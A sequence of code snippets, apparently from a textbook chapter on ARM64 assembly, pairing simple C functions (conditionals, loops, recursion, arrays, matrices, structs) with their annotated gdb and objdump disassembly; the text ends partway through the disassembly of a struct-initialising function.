["```\n$ uname -p\n\naarch64\n```", "```\n#include <stdio.h>\n\n//adds two to an integer and returns the result\n\nint adder2(int a) {\n\n    return a + 2;\n\n}\n\n int main(){\n\n    int x = 40;\n\n    x = adder2(x);\n\n    printf(\"x is: %d\\n\", x);\n\n    return 0;\n\n}\n```", "```\n$ gcc -o adder adder.c\n```", "```\n$ objdump -d adder > output\n\n$ less output\n```", "```\n0000000000000724 <adder2>:\n\n 724:   d10043ff        sub     sp, sp, #0x10\n\n 728:   b9000fe0        str     w0, [sp, #12]\n\n 72c:   b9400fe0        ldr     w0, [sp, #12]\n\n 730:   11000800        add     w0, w0, #0x2\n\n 734:   910043ff        add     sp, sp, #0x10\n\n 738:   d65f03c0        ret\n```", "```\n<opcode> <D>, <O1>, <O2>\n```", "```\nstr     w0, [sp, #12]\n\nldr     w0, [sp, #12]\n\nadd     w0, w0, #0x2\n```", "```\n//adds two to an integer and returns the result\n\nint adder2(int a) {\n\n    return a + 2;\n\n}\n```", "```\n0000000000000724 <adder2>:\n\n 724:   d10043ff        sub     sp, sp, #0x10\n\n 728:   b9000fe0        str     w0, [sp, #12]\n\n 72c:   b9400fe0        ldr     w0, [sp, #12]\n\n 730:   11000800        add     w0, w0, #0x2\n\n 734:   910043ff        add     sp, sp, #0x10\n\n 738:   d65f03c0        ret\n```", "```\ntst x0, x0\n```", "```\ncmp x0, #0\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if ( x > y ) { //if (conditional)\n\n        smallest = y; //then statement\n\n    }\n\n    else {\n\n        smallest = x; //else statement\n\n    }\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y ) { //if (!conditional)\n\n        goto else_statement;\n\n    }\n\n    smallest = y; //then statement\n\n    goto done;\n\nelse_statement:\n\n    smallest = x; //else statement\n\ndone:\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if ( x > y ) {\n\n        smallest = y;\n\n    }\n\n    else {\n\n        smallest = x;\n\n    }\n\n    return smallest;\n\n}\n```", "```\n(gdb) disas getSmallest\n\nDump of assembler code for function getSmallest:\n\n0x07f4 <+0>:    sub  sp, sp, #0x20\n\n0x07f8 <+4>:    str  w0, [sp, #12]\n\n0x07fc <+8>:    str  w1, [sp, #8]\n\n0x0800 <+12>:   ldr  w1, [sp, #12]\n\n0x0804 <+16>:   ldr  w0, [sp, #8]\n\n0x0808 <+20>:   cmp  w1, w0\n\n0x080c <+24>:   b.le 0x81c <getSmallest+40>\n\n0x0810 <+28>:   ldr  w0, [sp, #8]\n\n0x0814 <+32>:   str  w0, [sp, #28]\n\n0x0818 <+36>:   b    0x824 <getSmallest+48>\n\n0x081c <+40>:   ldr  w0, [sp, #12]\n\n0x0820 <+44>:   str  w0, [sp, #28]\n\n0x0824 <+48>:   ldr  w0, [sp, #28]\n\n0x0828 <+52>:   add  sp, sp, #0x20\n\n0x082c <+56>:   ret\n```", "```\n0x07f4 <+0>:   sub  sp, sp, #0x20          // grow stack by 32 bytes\n\n0x07f8 <+4>:   str  w0, [sp, #12]          // store x at sp+12\n\n0x07fc <+8>:   str  w1, [sp, #8]           // store y at sp+8\n\n0x0800 <+12>:  ldr  w1, [sp, #12]          // w1 = x\n\n0x0804 <+16>:  ldr  w0, [sp, #8]           // w0 = y\n\n0x0808 <+20>:  cmp  w1, w0                 // compare x and y\n\n0x080c <+24>:  b.le 0x81c <getSmallest+40> // if(x <= y) goto <getSmallest+40>\n\n0x0810 <+28>:  ldr  w0, [sp, #8]           // w0 = y\n\n0x0814 <+32>:  str  w0, [sp, #28]          // store y at sp+28 (smallest)\n\n 0x0818 <+36>:  b    0x824 <getSmallest+48> // goto <getSmallest+48>\n\n0x081c <+40>:  ldr  w0, [sp, #12]          // w0 = x\n\n0x0820 <+44>:  str  w0, [sp, #28]          // store x at sp+28 (smallest)\n\n0x0824 <+48>:  ldr  w0, [sp, #28]          // w0 = smallest\n\n0x0828 <+52>:  add  sp, sp, #0x20          // clean up stack\n\n0x082c <+56>:  ret                         // return smallest\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest=y;\n\n    if (x <= y) {\n\n        goto assign_x;\n\n    }\n\n    smallest = y;\n\n    goto done;\n\nassign_x:\n\n    smallest = x;\n\ndone:\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest=y;\n\n    if (x <= y) {\n\n        smallest = x;\n\n    }\n\n    else {\n\n        smallest = y;\n\n    }\n\n    return smallest;\n\n}\n```", "```\nif (<condition>) {\n\n    <then_statement>;\n\n}\n\nelse {\n\n    <else_statement>;\n\n}\n```", "```\n    if (!<condition>) {\n\n        goto else;\n\n    }\n\n    <then_statement>;\n\n    goto done;\n\nelse:\n\n    <else_statement>;\n\ndone:\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x > y) {     //!(x <= y)\n\n        smallest = y; //then_statement\n\n    }\n\n    else {\n\n        smallest = x; //else_statement\n\n    }\n\n    return smallest;\n\n}\n```", "```\nresult = (<condition>) ? <then_expression> : <else_expression>;\n```", "```\nint getSmallest_csel(int x, int y) {\n\n    return x > y ? y : x;\n\n}\n```", "```\n(gdb) disas getSmallest_csel\n\nDump of assembler code for function getSmallest_csel:\n\n0x0860 <+0>:  sub  sp, sp, #0x10      // grow stack by 16 bytes\n\n0x0864 <+4>:  str  w0, [sp, #12]      // store x at sp+12\n\n0x0868 <+8>:  str  w1, [sp, #8]       // store y at sp+8\n\n0x086c <+12>: ldr  w0, [sp, #8]       // w0 = y\n\n0x0870 <+16>: ldr  w2, [sp, #12]      // w2 = x\n\n0x0874 <+20>: ldr  w1, [sp, #12]      // w1 = x\n\n0x0878 <+24>: cmp  w2, w0             // compare x and y\n\n0x087c <+28>: csel w0, w1, w0, le     // if (x <= y) w0 = x, else w0=y\n\n0x0880 <+32>: add  sp, sp, #0x10      // restore sp\n\n0x0884 <+36>: ret                     // return (w0)\n```", "```\ncsel D, R1, R2, C // if (C) D = R1 else D = R2\n```", "```\n// compiled with: gcc -O1 -o getSmallest getSmallest.c\n\nDump of assembler code for function getSmallest:\n\n0x0734 <+0>: cmp  w0, w1            // compare x and y\n\n0x0738 <+4>: csel w0, w0, w1, le    // if (x<=y)  w0=x, else w0=y\n\n0x073c <+8>: ret                    // return (w0)\n\n```", "```\nint incrementX(int * x) {\n\n    if (x != NULL) { //if x is not NULL\n\n        return (*x)++; //increment x\n\n    }\n\n    else { //if x is NULL\n\n        return 1; //return 1\n\n    }\n\n}\n```", "```\nint incrementX2(int * x){\n\n    return x ? (*x)++ : 1;\n\n}\n```", "```\n// parameter x is in register x0\n\nDump of assembler code for function incrementX2:\n\n0x0774 <+0>:  mov  w1, #0x1                   // w1 = 0x1\n\n0x0778 <+4>:  cbz  x0, 0x788 <incrementX2+20> // if(x==0) goto<incrementX2+20>\n\n0x077c <+8>:  ldr  w1, [x0]                   // w1 = *x\n\n0x0780 <+12>: add  w2, w1, #0x1               // w2 = w1 + 1\n\n0x0784 <+16>: str  w2, [x0]                   // *x = w2\n\n0x0788 <+20>: mov  w0, w1                     // w0 = *x\n\n0x078c <+24>: ret                             // return (w0)\n```", "```\nint sumUp(int n) {\n\n    //initialize total and i\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {  //while i is less than or equal to n\n\n        total += i;   //add i to total\n\n        i++;          //increment i by 1\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumUp:\n\n0x0724 <+0>:   sub   sp, sp, #0x20\n\n0x0728 <+4>:   str   w0, [sp, #12]\n\n0x072c <+8>:   str   wzr, [sp, #24]\n\n0x0730 <+12>:  mov   w0, #0x1\n\n0x0734 <+16>:  str   w0, [sp, #28]\n\n0x0738 <+20>:  b     0x758 <sumUp+52>\n\n0x073c <+24>:  ldr   w1, [sp, #24]\n\n0x0740 <+28>:  ldr   w0, [sp, #28]\n\n0x0744 <+32>:  add   w0, w1, w0\n\n0x0748 <+36>:  str   w0, [sp, #24]\n\n0x074c <+40>:  ldr   w0, [sp, #28]\n\n0x0750 <+44>:  add   w0, w0, #0x1\n\n0x0754 <+48>:  str   w0, [sp, #28]\n\n0x0758 <+52>:  ldr   w1, [sp, #28]\n\n0x075c <+56>:  ldr   w0, [sp, #12]\n\n0x0760 <+60>:  cmp   w1, w0\n\n0x0764 <+64>:  b.le  0x73c <sumUp+24>\n\n0x0768 <+68>:  ldr   w0, [sp, #24]\n\n0x076c <+72>:  add   sp, sp, #0x20\n\n0x0770 <+76>:  ret\n```", "```\n0x0724 <+0>:  sub  sp, sp, #0x20   //grow stack by 32 bytes (new stack frame)\n\n0x0728 <+4>:  str  w0, [sp, #12]   //store n at sp+12 (n)\n\n0x072c <+8>:  str  wzr, [sp, #24]  //store 0 at sp+24 (total)\n\n0x0730 <+12>: mov  w0, #0x1        //w0 = 1\n\n0x0734 <+16>: str  w0, [sp, #28]   //store 1 at sp+28 (i)\n```", "```\n0x0738 <+20>: b     0x758 <sumUp+52>  // goto <sumUp+52>\n\n0x073c <+24>: ldr   w1, [sp, #24]     // w1 = total\n\n0x0740 <+28>: ldr   w0, [sp, #28]     // w0 = i\n\n0x0744 <+32>: add   w0, w1, w0        // w0 =  i + total\n\n0x0748 <+36>: str   w0, [sp, #24]     // store (total + i) at sp+24 (total+=i)\n\n0x074c <+40>: ldr   w0, [sp, #28]     // w0 = i\n\n0x0750 <+44>: add   w0, w0, #0x1      // w0 = i + 1\n\n0x0754 <+48>: str   w0, [sp, #28]     // store (i+1) at sp+28 (i++)\n\n0x0758 <+52>: ldr   w1, [sp, #28]     // w1 = i\n\n0x075c <+56>: ldr   w0, [sp, #12]     // w0 = n\n\n0x0760 <+60>: cmp   w1, w0            // compare i and n\n\n0x0764 <+64>: b.le  0x73c <sumUp+24>  // if (i <= n) goto <sumUp+24> \n```", "```\n0x0768 <+68>:  ldr   w0, [sp, #24]   // w0 = total\n\n0x076c <+72>:  add   sp, sp, #0x20   // restore stack\n\n0x0770 <+76>:  ret                   // return w0 (total)\n```", "```\n<sumUp>:\n\n  <+0>:   sub   sp, sp, #0x20\n\n  <+4>:   str   w0, [sp, #12]\n\n  <+8>:   str   wzr, [sp, #24]\n\n  <+12>:  mov   w0, #0x1\n\n  <+16>:  str   w0, [sp, #28]\n\n  <+20>:  b     0x758 <sumUp+52>\n\n  <+24>:  ldr   w1, [sp, #24]\n\n  <+28>:  ldr   w0, [sp, #28]\n\n  <+32>:  add   w0, w1, w0\n\n  <+36>:  str   w0, [sp, #24]\n\n  <+40>:  ldr   w0, [sp, #28]\n\n  <+44>:  add   w0, w0, #0x1\n\n  <+48>:  str   w0, [sp, #28]\n\n  <+52>:  ldr   w1, [sp, #28]\n\n  <+56>:  ldr   w0, [sp, #12]\n\n  <+60>:  cmp   w1, w0\n\n  <+64>:  b.le  0x73c <sumUp+24>\n\n  <+68>:  ldr   w0, [sp, #24]\n\n  <+72>:  add   sp, sp, #0x20\n\n  <+76>:  ret\n```", "```\nint sumUp(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    goto start;\n\nbody:\n\n    total += i;\n\n    i += 1;\n\nstart:\n\n    if (i <= n) {\n\n        goto body;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n while (i <= n) {\n\n        total += i;\n\n        i += 1;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp2(int n) {\n\n    int total = 0;             //initialize total to 0\n\n    int i;\n\n    for (i = 1; i <= n; i++) { //initialize i to 1, increment by 1 while i<=n\n\n        total += i;            //updates total by i\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumUp2:\n\n0x0774 <+0>:  sub   sp, sp, #0x20     // grow stack by 32 bytes (new frame)\n\n0x0778 <+4>:  str   w0, [sp, #12]     // store n at sp+12 (n)\n\n0x077c <+8>:  str   wzr, [sp, #24]    // store 0 at sp+24 (total)\n\n0x0780 <+12>: mov   w0, #0x1          // w0 = 1\n\n0x0784 <+16>: str   w0, [sp, #28]     // store 1 at sp+28 (i)\n\n0x0788 <+20>: b     0x7a8 <sumUp2+52> // goto <sumUp2+52>\n\n0x078c <+24>: ldr   w1, [sp, #24]     // w1 = total\n\n0x0790 <+28>: ldr   w0, [sp, #28]     // w0 = i\n\n0x0794 <+32>: add   w0, w1, w0        // w0 = total + i\n\n0x0798 <+36>: str   w0, [sp, #24]     // store (total+i) in total\n\n0x079c <+40>: ldr   w0, [sp, #28]     // w0 = i\n\n0x07a0 <+44>: add   w0, w0, #0x1      // w0 = i + 1\n\n0x07a4 <+48>: str   w0, [sp, #28]     // store (i+1) in i (i.e., i+=1)\n\n0x07a8 <+52>: ldr   w1, [sp, #28]     // w1 = i\n\n0x07ac <+56>: ldr   w0, [sp, #12]     // w0 = n\n\n0x07b0 <+60>: cmp   w1, w0            // compare i and n\n\n0x07b4 <+64>: b.le  0x78c <sumUp2+24> // if (i <= n) goto <sumUp2+24>\n\n0x07b8 <+68>: ldr   w0, [sp, #24]     // w0 = total\n\n0x07bc <+72>: add   sp, sp, #0x20     // restore stack\n\n0x07c0 <+76>: ret                     // return w0 (total)\n```", "```\nfor ( <initialization>; <boolean expression>; <step> ){\n\n    <body>\n\n}\n```", "```\n<initialization>\n\nwhile (<boolean expression>) {\n\n    <body>\n\n    <step>\n\n}\n```", "```\nint sumUp2(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    for (i; i <= n; i++) {\n\n        total += i;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp(int n){\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {\n\n        total += i;\n\n        i += 1;\n\n    }\n\n    return total;\n\n}\n```", "```\n#include <stdio.h>\n\nint assign() {\n\n    int y = 40;\n\n    return y;\n\n}\n\nint adder() {\n\n    int a;\n\n    return a + 2;\n\n}\n\nint main() {\n\n    int x;\n\n    assign();\n\n    x = adder();\n\n    printf(\"x is: %d\\n\", x);\n\n    return 0;\n\n}\n```", "```\n0000000000000724 <assign>:\n\n 724:   d10043ff        sub     sp, sp, #0x10\n\n 728:   52800500        mov     w0, #0x28                       // #40\n\n 72c:   b9000fe0        str     w0, [sp, #12]\n\n 730:   b9400fe0        ldr     w0, [sp, #12]\n\n 734:   910043ff        add     sp, sp, #0x10\n\n 738:   d65f03c0        ret\n\n000000000000073c <adder>:\n\n 73c:   d10043ff        sub     sp, sp, #0x10\n\n 740:   b9400fe0        ldr     w0, [sp, #12]\n\n 744:   11000800        add     w0, w0, #0x2\n\n 748:   910043ff        add     sp, sp, #0x10\n\n 74c:   d65f03c0        ret\n\n0000000000000750 <main>:\n\n 750:   a9be7bfd        stp     x29, x30, [sp, #-32]!\n\n 754:   910003fd        mov     x29, sp\n\n 758:   97fffff3        bl      724 <assign>\n\n 75c:   97fffff8        bl      73c <adder>\n\n 760:   b9001fa0        str     w0, [x29, #28]\n\n 764:   90000000        adrp    x0, 0 <_init-0x598>\n\n 768:   91208000        add     x0, x0, #0x820\n\n 76c:   b9401fa1        ldr     w1, [x29, #28]\n\n 770:   97ffffa8        bl      610 <printf@plt>\n\n 774:   52800000        mov     w0, #0x0                        // #0\n\n 778:   a8c27bfd        ldp     x29, x30, [sp], #32\n\n 77c:   d65f03c0        ret\n```", "```\nint printf(const char * format, ...)\n```", "```\nprintf(\"x is %d\\n\", x);\n```", "```\nint sumDown(int n) {\n\n    int total = 0;\n\n    int i = n;\n\n    while (i > 0) {\n\n        total += i;\n\n        i--;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumr(int n) {\n\n    if (n <= 0) {\n\n        return 0;\n\n    }\n\n    return n + sumr(n-1);\n\n}\n```", "```\nDump of assembler code for function sumr:\n\n0x770 <+0>:  stp   x29, x30, [sp, #-32]! // sp = sp-32; store x29,x30 on stack\n\n0x774 <+4>:  mov   x29, sp               // x29 = sp (i.e. x29 = top of stack)\n\n0x778 <+8>:  str   w0, [x29, #28]        // store w0 at x29+28 (n)\n\n0x77c <+12>: ldr   w0, [x29, #28]        // w0 = n\n\n0x780 <+16>: cmp   w0, #0x0              // compare n to 0\n\n0x784 <+20>: b.gt  0x790 <sumr+32>       // if (n > 0) goto <sumr+32>\n\n0x788 <+24>: mov   w0, #0x0              // w0 = 0\n\n0x78c <+28>: b     0x7a8 <sumr+56>       // goto <sumr+56>\n\n0x790 <+32>: ldr   w0, [x29, #28]        // w0 = n\n\n0x794 <+36>: sub   w0, w0, #0x1          // w0 = w0 - 1 (i.e. n-1)\n\n0x798 <+40>: bl    0x770 <sumr>          // call sumr(n-1) (result)\n\n0x79c <+44>: mov   w1, w0                // copy result into register w1\n\n0x7a0 <+48>: ldr   w0, [x29, #28]        // w0 = n\n\n0x7a4 <+52>: add   w0, w1, w0            // w0 = w0 + w1 (i.e n + result)\n\n0x7a8 <+56>: ldp   x29, x30, [sp], #32   // restore x29, x30, and sp\n\n0x7ac <+60>: ret                         // return w0 (result)\n```", "```\nint sumr(int n) {\n\n    int result;\n\n    if (n > 0) {\n\n        goto body;\n\n    }\n\n    result = 0;\n\n    goto done;\n\nbody:\n\n    result = n;\n\n    result--;\n\n    result = sumr(result);\n\n    result += n;\n\ndone:\n\n    return result;\n\n}\n```", "```\nint sumr(int n) {\n\n    int result;\n\n    if (n <= 0) {\n\n        return 0;\n\n    }\n\n    result = sumr(n-1);\n\n    result += n;\n\n    return result;\n\n}\n```", "```\nint sumArray(int *array, int length) {\n\n    int i, total = 0;\n\n    for (i = 0; i < length; i++) {\n\n        total += array[i];\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumArray:\n\n0x874 <+0>:   sub    sp, sp, #0x20       // grow stack by 32 bytes (new frame)\n\n0x878 <+4>:   str    x0, [sp, #8]        // store x0 at sp + 8 (array address)\n\n0x87c <+8>:   str    w1, [sp, #4]        // store w1 at sp + 4 (length)\n\n0x880 <+12>:  str    wzr, [sp, #28]      // store 0 at sp + 28  (total)\n\n0x884 <+16>:  str    wzr, [sp, #24]      // store 0 at sp + 24 (i)\n\n0x888 <+20>:  b      0x8b8 <sumArray+68> // goto <sumArray+68>\n\n0x88c <+24>:  ldrsw  x0, [sp, #24]       // x0 = i\n\n0x890 <+28>:  lsl    x0, x0, #2          // left shift i by 2 (i ≪ 2, or i*4)\n\n0x894 <+32>:  ldr    x1, [sp, #8]        // x1 = array\n\n0x898 <+36>:  add    x0, x1, x0          // x0 = array + i*4\n\n0x89c <+40>:  ldr    w0, [x0]            // w0 = array[i]\n\n0x8a0 <+44>:  ldr    w1, [sp, #28]       // w1 = total\n\n0x8a4 <+48>:  add    w0, w1, w0          // w0 = total + array[i]\n\n0x8a8 <+52>:  str    w0, [sp, #28]       // store (total + array[i]) in total\n\n0x8ac <+56>:  ldr    w0, [sp, #24]       // w0 = i\n\n0x8b0 <+60>:  add    w0, w0, #0x1        // w0 = w0 + 1 (i+1)\n\n0x8b4 <+64>:  str    w0, [sp, #24]       // store (i + 1) in i (i.e. i+=1)\n\n0x8b8 <+68>:  ldr    w1, [sp, #24]       // w1 = i\n\n0x8bc <+72>:  ldr    w0, [sp, #4]        // w0 = length\n\n0x8c0 <+76>:  cmp    w1, w0              // compare i and length\n\n0x8c4 <+80>:  b.lt   0x88c <sumArray+24> // if (i < length) goto <sumArray+24>\n\n0x8c8 <+84>:  ldr    w0, [sp, #28]       // w0 = total\n\n0x8cc <+88>:  add    sp, sp, #0x20       // revert stack to original state\n\n0x8d0 <+92>:  ret                        // return (total)\n```", "```\n0x890 <+28>:  lsl    x0, x0, #2         // left shift i by 2 (i ≪ 2, or i*4)\n\n0x894 <+32>:  ldr    x1, [sp, #8]       // x1 = array\n\n0x898 <+36>:  add    x0, x1, x0         // x0 = array + i*4\n\n0x89c <+40>:  ldr    w0, [x0]           // w0 = array[i]\n\n0x8a0 <+44>:  ldr    w1, [sp, #28]      // w1 = total\n\n0x8a4 <+48>:  add    w0, w1, w0         // w0 = total + array[i]\n\n0x8a8 <+52>:  str    w0, [sp, #28]      // store (total + array[i]) in total\n```", "```\n//statically allocated matrix (allocated on stack)\n\nint M1[4][3];\n\n//dynamically allocated matrix (programmer friendly, allocated on heap)\n\nint **M2, i;\n\nM2 = malloc(4 * sizeof(int*));\n\nfor (i = 0; i < 4; i++) {\n\n    M2[i] = malloc(3 * sizeof(int));\n\n}\n```", "```\n//dynamic matrix (allocated on heap, memory efficient way)\n\n#define ROWS 4\n\n#define COLS 3\n\nint *M3;\n\nM3 = malloc(ROWS*COLS*sizeof(int));\n```", "```\nint sumMat(int *m, int rows, int cols) {\n\n    int i, j, total = 0;\n\n    for (i = 0; i < rows; i++){\n\n        for (j = 0; j < cols; j++){\n\n            total += m[i*cols + j];\n\n        }\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumMat:\n\n0x884 <+0>:   sub   sp, sp, #0x20      // grow stack by 32 bytes (new frame)\n\n0x888 <+4>:   str   x0, [sp, #8]       // store m in location sp + 8\n\n0x88c <+8>:   str   w1, [sp, #4]       // store rows in location sp + 4\n\n0x890 <+12>:  str   w2, [sp]           // store cols at top of stack\n\n0x894 <+16>:  str   wzr, [sp, #28]     // store zero at sp + 28 (total)\n\n0x898 <+20>:  str   wzr, [sp, #20]     // store zero at sp + 20 (i)\n\n0x89c <+24>:  b     0x904 <sumMat+128> // goto <sumMat+128>\n\n0x8a0 <+28>:  str   wzr, [sp, #24]     // store zero at sp + 24 (j)\n\n0x8a4 <+32>:  b     0x8e8 <sumMat+100> // goto <sumMat+100>\n\n0x8a8 <+36>:  ldr   w1, [sp, #20]      // w1 = i\n\n0x8ac <+40>:  ldr   w0, [sp]           // w0 = cols\n\n0x8b0 <+44>:  mul   w1, w1, w0         // w1 = cols * i\n\n0x8b4 <+48>:  ldr   w0, [sp, #24]      // w0 = j\n\n0x8b8 <+52>:  add   w0, w1, w0         // w0 = (cols * i) + j\n\n0x8bc <+56>:  sxtw  x0, w0             // x0 = signExtend(cols * i + j)\n\n0x8c0 <+60>:  lsl   x0, x0, #2         // x0 = (cols * i + j) * 4\n\n0x8c4 <+64>:  ldr   x1, [sp, #8]       // x1 = m\n\n0x8c8 <+68>:  add   x0, x1, x0         // x0 = m+(cols*i+j)*4 (or &m[i*cols+j])\n\n0x8cc <+72>:  ldr   w0, [x0]           // w0 = m[i*cols + j]\n\n0x8d0 <+76>:  ldr   w1, [sp, #28]      // w1 = total\n\n0x8d4 <+80>:  add   w0, w1, w0         // w0 = total + m[i*cols + j]\n\n0x8d8 <+84>:  str   w0, [sp, #28]      // total is now (total + m[i*cols + j])\n\n0x8dc <+88>:  ldr   w0, [sp, #24]      // w0  = j\n\n0x8e0 <+92>:  add   w0, w0, #0x1       // w0 = j + 1\n\n0x8e4 <+96>:  str   w0, [sp, #24]      // update j  with (j + 1)\n\n0x8e8 <+100>: ldr   w1, [sp, #24]      // w1 = j\n\n0x8ec <+104>: ldr   w0, [sp]           // w0 = cols\n\n0x8f0 <+108>: cmp   w1, w0             // compare j with cols\n\n0x8f4 <+112>: b.lt  0x8a8 <sumMat+36>  // if (j < cols) goto <sumMat+36>\n\n0x8f8 <+116>: ldr   w0, [sp, #20]      // w0 = i\n\n0x8fc <+120>: add   w0, w0, #0x1       // w0 = i + 1\n\n0x900 <+124>: str   w0, [sp, #20]      // update i with (i+1)\n\n0x904 <+128>: ldr   w1, [sp, #20]      // w1 = i\n\n0x908 <+132>: ldr   w0, [sp, #4]       // w0 = rows\n\n0x90c <+136>: cmp   w1, w0             // compare i with rows\n\n0x910 <+140>: b.lt  0x8a0 <sumMat+28>  // if (i < rows) goto <sumMat+28>\n\n0x914 <+144>: ldr   w0, [sp, #28]      // w0 = total\n\n0x918 <+148>: add   sp, sp, #0x20      // revert stack to prior state\n\n0x91c <+152>: ret                      // return (total)\n```", "```\n0x8a8 <+36>:   ldr   w1, [sp, #20]       // w1 = i\n\n0x8ac <+40>:   ldr   w0, [sp]            // w0 = cols\n\n0x8b0 <+44>:   mul   w1, w1, w0          // w1 = cols * i\n```", "```\n0x8b4 <+48>:   ldr   w0, [sp, #24]       // w0 = j\n\n0x8b8 <+52>:   add   w0, w1, w0          // w0 = (cols * i) + j\n\n0x8bc <+56>:   sxtw  x0, w0              // x0 = signExtend(cols * i + j)\n\n0x8c0 <+60>:   lsl   x0, x0, #2          // x0 = (cols * i + j) * 4\n```", "```\n0x8c4 <+64>: ldr   x1, [sp, #8]  // x1 = m\n\n0x8c8 <+68>: add   x0, x1, x0    // x0 = m + (cols*i + j)*4 (or m[i*cols + j])\n\n0x8cc <+72>: ldr   w0, [x0]      // w0 = m[i*cols + j]\n\n0x8d0 <+76>: ldr   w1, [sp, #28] // w1 = total\n\n0x8d4 <+80>: add   w0, w1, w0    // w0 = total + m[i*cols + j]\n\n0x8d8 <+84>: str   w0, [sp, #28] // update total with (total + m[i*cols + j])\n```", "```\nint sumMatrix(int **matrix, int rows, int cols) {\n\n    int i, j, total=0;\n\n    for (i = 0; i < rows; i++) {\n\n        for (j = 0; j < cols; j++) {\n\n            total += matrix[i][j];\n\n        }\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumMatrix:\n\n0x920 <+0>:   sub   sp, sp, #0x20         // grow stack 32 bytes (new frame)\n\n0x924 <+4>:   str   x0, [sp, #8]          // store matrix at sp + 8\n\n0x928 <+8>:   str   w1, [sp, #4]          // store rows at sp + 4\n\n0x92c <+12>:  str   w2, [sp]              // store cols at sp (top of stack)\n\n0x930 <+16>:  str   wzr, [sp, #28]        // store 0 at sp + 28 (total)\n\n0x934 <+20>:  str   wzr, [sp, #20]        // store 0 at sp + 20 (i)\n 0x938 <+24>:  b     0x99c <sumMatrix+124> // goto <sumMatrix+124>\n\n0x93c <+28>:  str   wzr, [sp, #24]        // store 0 at sp + 24 (j)\n\n0x940 <+32>:  b     0x980 <sumMatrix+96>  // goto <sumMatrix+96>\n\n0x944 <+36>:  ldrsw x0, [sp, #20]         // x0 = signExtend(i)\n\n0x948 <+40>:  lsl   x0, x0, #3            // x0 = i ≪ 3 (or i * 8)\n\n0x94c <+44>:  ldr   x1, [sp, #8]          // x1 = matrix\n\n0x950 <+48>:  add   x0, x1, x0            // x0 = matrix + i * 8\n\n0x954 <+52>:  ldr   x1, [x0]              // x1 = matrix[i]\n\n0x958 <+56>:  ldrsw x0, [sp, #24]         // x0 = signExtend(j)\n\n0x95c <+60>:  lsl   x0, x0, #2            // x0 = j ≪ 2 (or j * 4)\n\n0x960 <+64>:  add   x0, x1, x0            // x0 = matrix[i] + j * 4\n\n0x964 <+68>:  ldr   w0, [x0]              // w0 = matrix[i][j]\n\n0x968 <+72>:  ldr   w1, [sp, #28]         // w1 = total\n\n0x96c <+76>:  add   w0, w1, w0            // w0 = total + matrix[i][j]\n\n0x970 <+80>:  str   w0, [sp, #28]         // store total = total+matrix[i][j]\n\n0x974 <+84>:  ldr   w0, [sp, #24]         // w0 = j\n\n0x978 <+88>:  add   w0, w0, #0x1          // w0 = j + 1\n\n0x97c <+92>:  str   w0, [sp, #24]         // update j with (j + 1)\n\n0x980 <+96>:  ldr   w1, [sp, #24]         // w1 = j\n\n0x984 <+100>: ldr   w0, [sp]              // w0 = cols\n\n0x988 <+104>: cmp   w1, w0                // compare j with cols\n\n0x98c <+108>: b.lt  0x944 <sumMatrix+36>  // if (j < cols) goto <sumMatrix+36>\n\n0x990 <+112>: ldr   w0, [sp, #20]         // w0 = i\n\n0x994 <+116>: add   w0, w0, #0x1          // w0 = i + 1\n\n0x998 <+120>: str   w0, [sp, #20]         // update i with (i + 1)\n\n0x99c <+124>: ldr   w1, [sp, #20]         // w1 = i\n\n0x9a0 <+128>: ldr   w0, [sp, #4]          // w0 = rows\n\n0x9a4 <+132>: cmp   w1, w0                // compare i with rows\n\n0x9a8 <+136>: b.lt  0x93c <sumMatrix+28>  // if (i < rows) goto <sumMatrix+28>\n\n0x9ac <+140>: ldr   w0, [sp, #28]         // w0 = total\n\n0x9b0 <+144>: add   sp, sp, #0x20         // revert stack to its original form\n\n0x9b4 <+148>: ret                         // return (total)\n```", "```\n0x944 <+36>:   ldrsw  x0, [sp, #20]          // x0 = signExtend(i)\n\n0x948 <+40>:   lsl    x0, x0, #3             // x0 = i ≪ 3 (or i * 8)\n\n0x94c <+44>:   ldr    x1, [sp, #8]           // x1 = matrix\n\n0x950 <+48>:   add    x0, x1, x0             // x0 = matrix + i * 8\n\n0x954 <+52>:   ldr    x1, [x0]               // x1 = matrix[i]\n```", "```\n0x958 <+56>:   ldrsw  x0, [sp, #24]     // x0 = signExtend(j)\n\n0x95c <+60>:   lsl    x0, x0, #2        // x0 = j ≪ 2 (or j * 4)\n\n0x960 <+64>:   add    x0, x1, x0        // x0 = matrix[i] + j * 4\n\n0x964 <+68>:   ldr    w0, [x0]          // w0 = matrix[i][j]\n\n0x968 <+72>:   ldr    w1, [sp, #28]     // w1 = total\n\n0x96c <+76>:   add    w0, w1, w0        // w0 = total + matrix[i][j]\n\n0x970 <+80>:   str    w0, [sp, #28]     // store total = total + matrix[i][j]\n```", "```\nstruct studentT {\n\n    char name[64];\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n};\n\nstruct studentT student;\n```", "```\nvoid initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {\n\n    strncpy(s->name, nm, 64);\n\n    s->grad_yr = gr;\n\n    s->age = ag;\n\n    s->gpa = g;\n\n}\n```", "```\nDump of assembler code for function initStudent:\n\n0x7f4 <+0>:  stp  x29, x30, [sp, #-48]!  // sp-=48; store x29, x30 at sp, sp+4\n\n0x7f8 <+4>:  mov  x29, sp                